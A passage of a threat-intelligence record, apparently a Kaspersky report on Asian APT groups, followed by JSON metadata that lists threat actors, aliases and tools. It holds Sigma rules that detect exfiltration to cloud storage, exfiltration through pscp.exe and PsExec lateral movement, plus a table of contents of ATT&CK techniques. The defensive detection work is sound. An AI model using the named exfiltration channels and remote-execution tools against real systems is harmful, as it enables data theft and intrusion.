fbfbffc2-e0e3-48e9-a2bd8bb2994d10a0\nstatus: stable\ndescription: Adversaries may\nuse an existing, legitimate\nexternal Web service as a means\nfor relaying data to/from a\ncompromised system\nauthor: Kaspersky\nmodified: 2023-08-22\ntags:\n- attack.command_and_control\n- attack.t1102\n- attack.exfiltration\n- attack.t1567.002\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nCommandLine|contains:\n- 'pastebin.com'\n- 'raw.githubusercontent.\ncom'\n- 'github.com'\n- 'api.github.com'\n- 'gitee.com'\n- 'gitlab.com'\n- 'paste.ee'\n- 'cloudme.com'\n- '.s3.amazonaws.com'\n- 'sslip.io'\n- 'simp.ly'\n- '1drv.ms'\n- 'onedrive.live.com/\ndownload'\n- 'users.storage.live.com/\ndownloadfiles'\n- 'icloud.com/iclouddrive'\n- 'mega.nz'\n- 'cloud.mail.ru'\n- '.mediafire.com'\n- 'api.box.com'\n- 'apis.google.com'\n- 'googledrive.com'\n- 'drive.google.com'\n- 'docs.google.com'\n- 'sheets.google.com'\n- 'slides.google.com'\n- 'talk.google.com'\n- 'takeout.google.com'\n- 'gg.google.com'\n- 'script.google.com'\n- 'googleapis.com'\n- 'cloud-api.yandex.net'\n- 'oauth.yandex.ru'\n- 'disk.yandex.net'\n\n\n- 'webdav.yandex.ru'\n- 'discordapp.com'\n- 'file.io'\nfilter:\nImage|endswith:\n- '\\Microsoft\\Edge\\\nApplication\\msedge.exe'\n- '\\Google\\Chrome\\\nApplication\\chrome.exe'\n- '\\Mozilla Firefox\\firefox.exe'\n- '\\Opera\\opera.exe'\n- '\\yandex\\yandexbrowser\\\napplication\\browser.exe'\ncondition: selection and not filter\nfalsepositives:\n- Legitimate connections to cloud\nservices\nlevel: low\n\n\ntitle: Sigma-GenericExfiltretion via pscp.exe\n\nid: ef7de2db-603b-4a21-962445176856a6a6\nstatus: experimental\ndescription: Adversaries may\nsteal data by exfiltrating it over\nan existing command and control\nchannel via pscp.exe\nmodified: 2023-08-03\ntags:\n- attack.Exfiltration\n- attack.T1041\nauthor: Kaspersky\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\pscp.exe'\nCommandLine|contains|all:\n- '@'\n- ':'\n- '/'\ncondition: selection\nfalsepositives:\n- Administrators activity, legitimate\nsoftware (e.g. monitoring agents)\nlevel: medium\n\n\n-----\n\ntitle: Suspicious PsExec\nExecution\n\nid: 45cd98e2-a261-4fc4-b77f63136385a2dc\ndescription: Adversaries may use\nPsExec to transfer executables\nand run commands remotely with\nelevated privileges\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-09-20\ntags:\n- attack.lateral_movement\n- attack.t1021.002\n- attack.t1570\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\psexec.exe'\n- '\\paexec.exe'\n- '\\csexec.exe'\n- '\\remcom.exe'\nCommandLine|contains:\n- '-s '\n- '-h '\n- '-c '\n- '-u '\nselection2:\nImage|endswith:\n- 'PsExeSvc.exe'\n- 'PAExecSvc.exe'\n- 'CSExecSvc.exe'\n- 'RemComSvc.exe'\ncondition: selection1 or selection2\nfalsepositives:\n- Legitimate Administrator activity\nlevel: high\n\n\ntitle: Network Connection to\nCloud Storage\n\nid: ca93c22d-a349-4d8b-b85dbc49848c662d\nstatus: stable\ndescription: Adversaries may use\nan existing, legitimate external Web\nservice as a means for relaying data\nto/from a compromised system\nauthor: Kaspersky\nmodified: 2023-08-22\ntags:\n- attack.command_and_control\n- attack.t1102\n- attack.exfiltration\n- attack.t1567.002\nlogsource:\ncategory: network_connection\nproduct: windows\ndetection:\nselection:\nDestinationHostname|contains:\n- 'pastebin.com'\n- 'raw.githubusercontent.com'\n- 'github.com'\n- 'api.github.com'\n- 'gitee.com'\n- 'gitlab.com'\n- 'paste.ee'\n- 'cloudme.com'\n- '.s3.amazonaws.com'\n- 'sslip.io'\n- 'simp.ly'\n- '1drv.ms'\n- 'onedrive.live.com/\ndownload'\n- 'users.storage.live.com/\n\n\ndownloadfiles'\n- 'icloud.com/iclouddrive'\n- 'mega.nz'\n- 'cloud.mail.ru'\n- '.mediafire.com'\n- 'api.box.com'\n- 'apis.google.com'\n- 'googledrive.com'\n- 'drive.google.com'\n- 'docs.google.com'\n- 'sheets.google.com'\n- 'slides.google.com'\n- 'talk.google.com'\n- 'takeout.google.com'\n- 'gg.google.com'\n- 'script.google.com'\n- 'googleapis.com'\n- 'cloud-api.yandex.net'\n- 'oauth.yandex.ru'\n- 'disk.yandex.net'\n- 'webdav.yandex.ru'\n- 'discordapp.com'\n- 'file.io'\nfilter:\nImage|endswith:\n- '\\Microsoft\\Edge\\\nApplication\\msedge.exe'\n- '\\Google\\Chrome\\\nApplication\\chrome.exe'\n- '\\Mozilla Firefox\\firefox.exe'\n- '\\Opera\\opera.exe'\n- '\\yandex\\yandexbrowser\\\napplication\\browser.exe'\ncondition: selection and not filter\nfalsepositives:\n- Legitimate connections to cloud\nservices\nlevel: low\n\n\ntitle: PsExec Pipes Artifacts\n\nid: 3a6d7c34-b1e5-4c12-a8e6902847090c92\ndescription: Detecting PsExec\nusage via pipe creation\nreferences: https://redcanary.\ncom/blog/threat-hunting-psexeclateral-movement/\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-09-20\ntags:\n- attack.lateral_movement\n- attack.t1021.002\nlogsource:\nproduct: windows\n\n\ncategory: pipe_created\ndetection:\nselection:\nPipeName|contains:\n- 'psexesvc'\n- 'paexec'\n- 'remcom'\n- 'csexecsvc'\ncondition: selection\nfalsepositives:\n- Legitimate Administrator activity\nlevel: medium\n\n\n-----\n\n##### Contents\n\n###### Contents 2\n\n Introduction 3\n\n Intended audience of this report 4\n\n Authors and acknowledgments 5\n\n Structure of the report 6\n\n Incidents involving Asian APT groups  in various regions of the planet 7\n\nIncident 1. Russia and Belarus 10\n\nIncident 2. Indonesia 23\n\nIncident 3. Pakistan 36\n\nIncident 4. Malaysia 50\n\nIncident 5. Argentina 60\n\nSummary of the examined incidents 72\n\n###### Technical details 73\n\nInitial Access TA0001 74\n\nExploit Public-Facing Application T1190 74\n\nPhishing T1566 77\n\nPhishing: Spearphishing Attachment T1566.001 78\n\nExecution TA0002 88\n\nCommand and Scripting Interpreter T1059 88\n\nCommand and Scripting Interpreter: Windows\nCommand Shell T1059.003 89\n\nCommand and Scripting Interpreter: PowerShell\nT1059.001 95\n\nWindows Management Instrumentation T1047 98\n\nNative API T1106 103\n\nPersistence TA0003 104\n\nEvent Triggered Execution T1546 104\n\nEvent Triggered Execution: Windows Management\nInstrumentation Event Subscription T1546.003 105\n\nEvent Triggered Execution: Image File Execution\nOptions Injection T1546.012 107\n\nEvent Triggered Execution: Component Object Model\nHijacking T1546.015 110\n\n\nBITS Jobs T1197 114\n\nValid Accounts T1078 116\n\nValid Accounts: Domain Accounts T1078.002 117\n\nScheduled Task/Job T1053 118\n\nScheduled Task/Job: Scheduled Task T1053.005 119\n\nServer Software Component T1505 122\n\nServer Software Component: Web Shell T1505.003 123\n\nPrivilege Escalation TA0004 126\n\nCreate or Modify System Process T1543 126\n\nCreate or Modify System Process: Windows Service\nT1543.003 127\n\nDefense Evasion TA0005 133\n\nHijack Execution Flow T1574 133\n\nHijack Execution Flow: DLL Search Order Hijacking\nT1574.001 135\n\nHijack Execution Flow: DLL Side-Loading T1574.002 139\n\nIndicator Removal T1070 143\n\nIndicator Removal: File Deletion T1070.004 144\n\nIndicator Removal: Network Share Connection\nRemoval T1070.005 146\n\nProcess Injection T1055 147\n\nProcess Injection: Process Hollowing T1055.012 152\n\nImpair Defenses: Disable or Modify Tools T1562.001 156\n\nObfuscated Files or Information T1027 158\n\nMasquerading T1036 164\n\nMasquerading: Match Legitimate Name or Location\nT1036.005 168\n\nMasquerading: Masquerade Task or Service T1036.004 172\n\nCredential Access TA0006 176\n\nOS Credential Dumping T1003 176\n\nOS Credential Dumping: LSASS Memory T1003.001 177\n\nOS Credential Dumping: Security Account Manager\nT1003.002 184\n\nOS Credential Dumping: NTDS T1003.003 186\n\nUnsecured Credentials T1552 190\n\nUnsecured Credentials: Credentials In Files T1552.001 191\n\nCredentials from Password Stores T1555 193\n\nCredentials from Password Stores: Credentials from\nWeb Browsers T1555.003 194\n\nDiscovery TA0007 197\n\nSoftware Discovery T1518 197\n\nSystem Service Discovery T1007 200\n\n\n-----\n\nSystem Information Discovery T1082 205\n\nSystem Network Configuration Discovery T1016 208\n\nSystem Network Connections Discovery T1049 210\n\nSystem Time Discovery T1124 213\n\nPermission Groups Discovery T1069 215\n\nPermission Groups Discovery: Domain Groups\nT1069.002 216\n\nNetwork Share Discovery T1135 218\n\nRemote System Discovery T1018 221\n\nDomain Trust Discovery T1482 224\n\nQuery Registry T1012 228\n\nAccount Discovery T1087 230\n\nFile and Directory Discovery T1083 233\n\nGroup Policy Discovery T1615 235\n\nNetwork Service Discovery T1046 237\n\nProcess Discovery T1057 239\n\nSystem Owner/User Discovery T1033 241\n\nLateral Movement TA0008 243\n\nRemote Services T1021 243\n\nRemote Services: SMB/Windows Admin Shares\nT1021.002 244\n\nLateral Tool Transfer T1570 248\n\nReplication Through Removable Media T1091 250\n\nTaint Shared Content T1080 252\n\nPass the Hash T1550.002 254\n\nCollection TA0009 256\n\nArchive Collected Data T1560 256\n\nArchive Collected Data: Archive via Utility T1560.001 257\n\nAutomated Collection T1119 260\n\nData from Local System T1005 262\n\nCommand and Control TA0011 264\n\nApplication Layer Protocol T1071 264\n\nApplication Layer Protocol: Web Protocols T1071.001 265\n\nWeb Service T1102 268\n\nIngress Tool Transfer T1105 270\n\nProtocol Tunneling T1572 273\n\nExfiltration TA0010 277\n\nExfiltration Over Web Service T1567 277\n\nExfiltration Over Web Service: Exfiltration to Cloud\nStorage T1567.002 278\n\nExfiltration Over C2 Channel T1041 282\n\nImpact TA0040 288\n\n\n###### Analysis of attacker actions based on the Unified Kill Chain 289\n\n Mitigation 302\n\nHardening&Security 302\n\nPreventing downloads and execution 304\n\nPreventing lateral movement 305\n\nPreventing attackers from fulfilling their objectives 306\n\n###### Statistics on attacked companies 307\n\n Conclusions 313\n\n Appendix I — Sigma Rules 314\n\n\n-----\n\nKaspersky Threat Intelligence\n\n## Modern\n Asian APT Groups\n\nTactics, Techniques and Procedures\n\n[www.kaspersky.com](https://www.kaspersky.com)\n\n###### #kaspersky\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/dwhha91g1bkrjvmzdi1j8xylez9y6rzz",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2023/2023.11.09.Modern_Asian_APT_TTPs/Modern-Asian-APT-groups-TTPs_report_eng.pdf"
    ],
    "report_names": [
        "Kaspersky_Modern-Asian-APT-groups-TTPs_report_eng(11-09-2023)",
        "Modern-Asian-APT-groups-TTPs_report_eng"
    ],
    "threat_actors": [
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a4aca3ca-9e04-42d1-b037-f7fb3fbab0b1",
            "created_at": "2023-01-06T13:46:39.042499Z",
            "updated_at": "2025-03-27T02:00:02.984002Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Colourful Panda",
                "BRONZE DUDLEY"
            ],
            "source_name": "MISPGALAXY:TA428",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2864e40a-f233-4618-ac61-b03760a41cbb",
            "created_at": "2023-12-01T02:02:34.272108Z",
            "updated_at": "2025-03-27T02:02:10.209072Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "ETDA:WildCard",
            "tools": [
                "RustDown",
                "SysJoker"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d06cd44b-3efe-47dc-bb7c-a7b091c02938",
            "created_at": "2023-11-08T02:00:07.135638Z",
            "updated_at": "2025-03-27T02:00:03.193635Z",
            "deleted_at": null,
            "main_name": "IronHusky",
            "aliases": [],
            "source_name": "MISPGALAXY:IronHusky",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0eca237-f191-448f-87d1-5d6b3651cbff",
            "created_at": "2024-02-06T02:00:04.140087Z",
            "updated_at": "2025-03-27T02:00:03.323578Z",
            "deleted_at": null,
            "main_name": "GhostEmperor",
            "aliases": [
                "FamousSparrow",
                "UNC2286",
                "Salt Typhoon",
                "RedMike"
            ],
            "source_name": "MISPGALAXY:GhostEmperor",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aacd5cbc-604b-4b6e-9e58-ef96c5d1a784",
            "created_at": "2023-01-06T13:46:38.953463Z",
            "updated_at": "2025-03-27T02:00:02.961301Z",
            "deleted_at": null,
            "main_name": "APT31",
            "aliases": [
                "JUDGMENT PANDA",
                "BRONZE VINEWOOD",
                "Red keres",
                "Violet Typhoon",
                "TA412"
            ],
            "source_name": "MISPGALAXY:APT31",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4a502340-ae29-4a3a-8142-7fbbc2ec79b5",
            "created_at": "2024-05-01T02:03:08.138302Z",
            "updated_at": "2025-03-27T02:05:17.416542Z",
            "deleted_at": null,
            "main_name": "NICKEL HYATT",
            "aliases": [
                "Dark Seoul",
                "Jumpy Pisces ",
                "Onyx Sleet ",
                "RIFLE Campaign",
                "Silent Chollima ",
                "Andariel"
            ],
            "source_name": "Secureworks:NICKEL HYATT",
            "tools": [
                " DTrack",
                " Rifle",
                " UnitBot",
                " Valefor",
                "ActiveX 0-day"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d67df52c-a901-4d55-b287-321818500789",
            "created_at": "2024-04-24T02:00:49.591518Z",
            "updated_at": "2025-03-27T02:00:55.515052Z",
            "deleted_at": null,
            "main_name": "ToddyCat",
            "aliases": [
                "ToddyCat"
            ],
            "source_name": "MITRE:ToddyCat",
            "tools": [
                "Cobalt Strike",
                "LoFiSe",
                "China Chopper",
                "netstat",
                "Pcexter",
                "Samurai"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4c4e1108-8c11-48e3-91e3-95c24042f3a5",
            "created_at": "2022-10-25T16:07:24.329539Z",
            "updated_at": "2025-03-27T02:02:10.17315Z",
            "deleted_at": null,
            "main_name": "ToddyCat",
            "aliases": [
                "Operation Stayin’ Alive"
            ],
            "source_name": "ETDA:ToddyCat",
            "tools": [
                "CHINACHOPPER",
                "China Chopper",
                "Cuthead",
                "FRP",
                "Fast Reverse Proxy",
                "Impacket",
                "Krong",
                "LoFiSe",
                "Ngrok",
                "PcExter",
                "PsExec",
                "Samurai",
                "SinoChopper",
                "SoftEther VPN",
                "TomBerBil",
                "WAExp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c416260c-7ff6-4a74-a5ba-a15f40d3543f",
            "created_at": "2024-05-01T02:03:07.939268Z",
            "updated_at": "2025-03-27T02:05:17.25652Z",
            "deleted_at": null,
            "main_name": "BRONZE DUDLEY",
            "aliases": [
                "Temp.Hex ",
                "Vicious Panda ",
                "TA428 "
            ],
            "source_name": "Secureworks:BRONZE DUDLEY",
            "tools": [
                "PoisonIvy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9e6186dd-9334-4aac-9957-98f022cd3871",
            "created_at": "2022-10-25T15:50:23.357398Z",
            "updated_at": "2025-03-27T02:00:55.452383Z",
            "deleted_at": null,
            "main_name": "ZIRCONIUM",
            "aliases": [
                "APT31",
                "Violet Typhoon"
            ],
            "source_name": "MITRE:ZIRCONIUM",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2caf4672-1812-4bb9-9576-6011e56102d2",
            "created_at": "2022-10-25T16:07:23.742765Z",
            "updated_at": "2025-03-27T02:02:09.957037Z",
            "deleted_at": null,
            "main_name": "IronHusky",
            "aliases": [
                "BBCY-TA1",
                "Operation MysterySnail"
            ],
            "source_name": "ETDA:IronHusky",
            "tools": [
                "Agent.dhwf",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "MysterySnail",
                "MysterySnail RAT",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "774f15f7-832e-4cd4-a1fa-ec6a838f2a40",
            "created_at": "2022-10-25T16:47:55.641406Z",
            "updated_at": "2025-03-27T02:05:17.29791Z",
            "deleted_at": null,
            "main_name": "BRONZE VINEWOOD",
            "aliases": [
                "Judgment Panda ",
                "ZIRCONIUM ",
                "APT31 "
            ],
            "source_name": "Secureworks:BRONZE VINEWOOD",
            "tools": [
                " HanaLoader",
                " Metasploit",
                " Mimikatz",
                " Reverse ICMP shell",
                " Trochilus",
                "DropboxAES RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "5c13338b-eaed-429a-9437-f5015aa98276",
            "created_at": "2022-10-25T16:07:23.582715Z",
            "updated_at": "2025-03-27T02:02:09.875151Z",
            "deleted_at": null,
            "main_name": "Emissary Panda",
            "aliases": [
                "APT 27",
                "ATK 15",
                "Bronze Union",
                "Budworm",
                "Earth Smilodon",
                "Emissary Panda",
                "Group 35",
                "Iron Taurus",
                "Iron Tiger",
                "LuckyMouse",
                "Operation DRBControl",
                "Operation Iron Tiger",
                "Operation PZChao",
                "Operation SpoiledLegacy",
                "Operation StealthyTrident",
                "Red Phoenix",
                "TEMP.Hippo",
                "TG-3390",
                "ZipToken"
            ],
            "source_name": "ETDA:Emissary Panda",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agent.dhwf",
                "AngryRebel",
                "Antak",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "FOCUSFJORD",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HTran",
                "HUC Packet Transmit Tool",
                "HighShell",
                "HttpBrowser RAT",
                "HttpDump",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "Nishang",
                "OwaAuth",
                "PCRat",
                "PlugX",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SEASHARPEE",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "SysUpdate",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Token Control",
                "TokenControl",
                "TwoFace",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "gsecdump",
                "luckyowa"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d390d62a-6e11-46e5-a16f-a88898a8e6ff",
            "created_at": "2024-12-28T02:01:54.899899Z",
            "updated_at": "2025-03-27T02:02:10.122415Z",
            "deleted_at": null,
            "main_name": "Salt Typhoon",
            "aliases": [
                "Earth Estries",
                "FamousSparrow",
                "GhostEmperor",
                "RedMike",
                "Salt Typhoon",
                "UNC2286"
            ],
            "source_name": "ETDA:Salt Typhoon",
            "tools": [
                "Agentemis",
                "Backdr-NQ",
                "Cobalt Strike",
                "CobaltStrike",
                "Crowdoor",
                "Cryptmerlin",
                "Deed RAT",
                "Demodex",
                "FamousSparrow",
                "FuxosDoor",
                "GHOSTSPIDER",
                "HemiGate",
                "MASOL RAT",
                "Mimikatz",
                "NBTscan",
                "NinjaCopy",
                "ProcDump",
                "PsExec",
                "PsList",
                "SnappyBee",
                "SparrowDoor",
                "TrillClient",
                "WinRAR",
                "Zingdoor",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "256a6a2d-e8a2-4497-b399-628a7fad4b3e",
            "created_at": "2023-11-30T02:00:07.299845Z",
            "updated_at": "2025-03-27T02:00:03.257794Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "MISPGALAXY:WildCard",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "115ee14e-a122-47a4-bef7-5d3668cda109",
            "created_at": "2025-01-10T02:00:03.15179Z",
            "updated_at": "2025-03-27T02:00:03.477693Z",
            "deleted_at": null,
            "main_name": "CoughingDown",
            "aliases": [],
            "source_name": "MISPGALAXY:CoughingDown",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "60d96824-1767-4b97-a6c7-7e9527458007",
            "created_at": "2023-01-06T13:46:39.378701Z",
            "updated_at": "2025-03-27T02:00:03.068436Z",
            "deleted_at": null,
            "main_name": "ToddyCat",
            "aliases": [
                "Websiic"
            ],
            "source_name": "MISPGALAXY:ToddyCat",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1702951495,
    "ts_updated_at": 1743041820,
    "ts_creation_date": 1699551397,
    "ts_modification_date": 1699533775,
    "files": {
